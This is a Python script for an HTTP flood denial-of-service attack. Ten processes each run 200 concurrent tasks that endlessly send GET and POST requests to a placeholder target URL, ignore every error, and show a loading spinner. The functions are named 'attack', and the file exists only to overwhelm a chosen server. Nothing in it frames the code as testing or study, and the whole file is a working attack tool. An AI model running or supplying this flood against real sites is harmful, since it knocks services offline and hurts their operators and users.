import multiprocessing
import asyncio
import aiohttp
import sys
import time
import threading

url = "http:"  # Replace with your actual target URL
CONCURRENT_REQUESTS = 200  # Number of parallel requests per process
num_processes = 10  # Adjust based on CPU power

# Async function to send multiple GET and POST requests
async def attack():
    async with aiohttp.ClientSession() as session:
        tasks = [send_requests(session) for _ in range(CONCURRENT_REQUESTS)]
        await asyncio.gather(*tasks)

# Function to send both GET and POST requests
async def send_requests(session):
    while True:
        try:
            # Send GET request
            async with session.get(url) as response:
                await response.text()
            
            # Send POST request with sample data
            async with session.post(url, data={"key": "value"}) as response:
                await response.text()
        
        except Exception:
            pass  # Ignore errors

# Multiprocessing wrapper
def start_attack():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(attack())

# Loading animation function
def loading_animation():
    spinner = "-/|\\"
    while True:
        for char in spinner:
            sys.stdout.write(f"\rLoading {char}")
            sys.stdout.flush()
            time.sleep(0.1)

if __name__ == "__main__":
    processes = []

    # Start loading animation in a separate thread
    loading_thread = threading.Thread(target=loading_animation, daemon=True)
    loading_thread.start()

    # Start multiple attack processes
    for _ in range(num_processes):
        p = multiprocessing.Process(target=start_attack)
        p.start()
        processes.append(p)

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\nStopping attack...")
        for p in processes:
            p.terminate()
        sys.exit(0)
